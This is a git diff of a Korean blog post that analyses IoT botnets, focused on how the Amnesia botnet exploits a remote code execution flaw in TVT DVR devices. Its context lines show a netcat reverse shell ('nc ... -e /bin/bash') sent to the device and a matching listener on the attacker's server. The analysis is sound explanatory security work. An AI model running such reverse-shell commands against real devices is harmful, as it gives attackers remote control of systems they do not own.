@@ -2,7 +2,7 @@
 layout: post
 title:  "IoT Botnet Analysis"
 tag:   Analysis
-categories: IoT Analysis mirai Bricker persu
+categories: IoT persu
 modified: 2017-04-26
 comments: true
 featured: true
@@ -493,6 +493,7 @@ Amnesia botnet은 취약한 시스템을 검색하여 RCE(Remote code execution)
 ## Amnesia botnet 동작 과정
 
 ### 1. 감염
+감염 단계에서는 위 취약점을 이용해 DVR Device를 감염 시키게 된다.
 
 ### 2. 제어
 감염된 DVR Device는 IRC 프로토콜을 이용하여 C2 서버와 통신을 하게 된다. 아래 그림처럼 다양한 DDoS 유형을 공격할 수 있게 설계되었다.
@@ -514,6 +515,7 @@ TVT Digital에서 제작한 DVR Device는 HTTP Response Header 내 "Cross Web Se
 취약한 DVR Device가 발견되면 Amnesia botnet은 RCE 취약점을 이용해 4가지 명령어를 HTTP Request로 보내게 된다.
 
 - DVR Device 측
+
 ```
 echo "nc" > f
 echo "{one_of_c2_domains : IP}" >> f
@@ -524,7 +526,9 @@ study persu$ ps
   PID TTY           TIME CMD
 13370 ttys000    0:00.01 nc 192.168.1.1 8888 -e /bin/bash
 ```
+
 - C2 서버 측 (가상환경)
+
 ```
 study persu$ nc -l -p 8888
 id
